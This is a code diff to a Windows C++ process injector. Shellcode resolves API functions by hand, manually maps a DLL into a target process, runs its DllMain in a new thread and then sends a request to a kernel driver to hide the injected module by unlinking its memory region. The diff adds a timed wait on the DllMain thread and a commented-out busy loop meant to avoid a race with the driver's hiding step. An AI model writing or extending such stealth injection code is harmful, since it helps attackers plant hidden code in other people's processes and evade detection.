@@ -519,6 +519,7 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
     typedef NTSTATUS(NTAPI* pfnNtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval);
     typedef PVOID(NTAPI* pfnRtlAllocateHeap)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
     typedef BOOL(NTAPI* pfnRtlFreeHeap)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
+    typedef DWORD (NTAPI* pfnWaitForSingleObject)(HANDLE hHandle, DWORD  dwMilliseconds);
     
     typedef HANDLE(WINAPI* pfnCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
     typedef BOOL(WINAPI* pfnDeviceIoControl)(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);
@@ -555,6 +556,7 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
     __declspec(allocate(".stub")) static const CHAR cNtDelayExecutionFunction[] = "NtDelayExecution";
     __declspec(allocate(".stub")) static const CHAR cRtlAllocateHeapFunction[] = "RtlAllocateHeap";
     __declspec(allocate(".stub")) static const CHAR cRtlFreeHeapFunction[] = "RtlFreeHeap";
+    __declspec(allocate(".stub")) static const CHAR cWaitForSingleObjectFunction[] = "WaitForSingleObject";
 
     __declspec(allocate(".stub")) static const CHAR cCreateFileWFunction[] = "CreateFileW";
     __declspec(allocate(".stub")) static const CHAR cDeviceIoControlFunction[] = "DeviceIoControl";
@@ -572,6 +574,7 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
     __declspec(allocate(".stub")) pfnNtDelayExecution my_NtDelayExecution = nullptr;
     __declspec(allocate(".stub")) pfnRtlAllocateHeap my_RtlAllocateHeap = nullptr;
     __declspec(allocate(".stub")) pfnRtlFreeHeap my_RtlFreeHeap = nullptr;
+    __declspec(allocate(".stub")) pfnWaitForSingleObject my_WaitForSingleObject = nullptr;
     
     __declspec(allocate(".stub")) pfnCreateFileW my_CreateFileW = nullptr;
     __declspec(allocate(".stub")) pfnDeviceIoControl my_DeviceIoControl = nullptr;
@@ -1192,6 +1195,9 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
         my_CreateThread = (pfnCreateThread)ShellcodeFindExportAddress(sLibs.hKERNELBASE, cCreateThreadFunction, my_LoadLibraryA);
         if(my_CreateThread == NULL) __debugbreak();
         
+        my_WaitForSingleObject = (pfnWaitForSingleObject)ShellcodeFindExportAddress(sLibs.hKERNELBASE, cWaitForSingleObjectFunction, my_LoadLibraryA);
+        if(my_WaitForSingleObject == NULL) __debugbreak();
+        
         my_RtlFillMemory = (pfnRtlFillMemory)ShellcodeFindExportAddress(sLibs.hHookedNtdll, cRtlFillMemoryFunction, my_LoadLibraryA);
         if(my_RtlFillMemory == NULL) __debugbreak();
 
@@ -1531,7 +1537,7 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
 
 
         DWORD rvaOfEntryPoint = pOptionalHeader_injected_dll->AddressOfEntryPoint;
-        if (rvaOfEntryPoint == 0) LOG_W(L"[SHELLCODE] DLL has no entry point. Skipping DllMain call.\n");
+        if(rvaOfEntryPoint == 0) LOG_W(L"[SHELLCODE] DLL has no entry point. Skipping DllMain call.\n");
         else
         {
             pfnDLLMain pfnDllMain = (pfnDLLMain)(pResources->Injected_dll_base + rvaOfEntryPoint);
@@ -1546,9 +1552,13 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
             DWORD dwDllMainThreadId = 0; 
             LOG_W(L"[SHELLCODE] Creating new thread to execute DllMain (0x%p) via DllMainThreadRunner\n", (void*)pfnDllMain);
             HANDLE hDllMainThread = my_CreateThread(NULL, 0, DllMainThreadRunner, pHeapParams, 0, &dwDllMainThreadId);
-            if (hDllMainThread)
+            if(hDllMainThread)
             {
                 LOG_W(L"[SHELLCODE] DllMain thread launched Thread id-> %d Handle-> 0x%p\n", dwDllMainThreadId, (void*)hDllMainThread);
+                
+                NTSTATUS status = my_WaitForSingleObject(hDllMainThread, 2000);
+                if(!NT_SUCCESS(status)) { LOG_W(L"[SHELLCODE] Wait for DllMain thread failed -> %d\n", status); return;}
+                
                 my_CloseHandle(hDllMainThread);
             }
             else
@@ -1718,6 +1728,9 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
         sHideModuleResources->hTargetPid = pResources->TargetPid;
         sHideModuleResources->vpInjectedResources_Base = pResources->Injected_Shellcode_base;
 
+        // // Busy wait to avoid race condition between Dllmain thread and Driver VAD unlink
+        // volatile unsigned int i;
+        // for (i = 0; i < 1000000000; i++) { }
 
         LOG_W(L"[SHELLCODE] Sending hide request to driver for PID: %p\n", sHideModuleResources->hTargetPid);
         DWORD bytes_returned = 0;
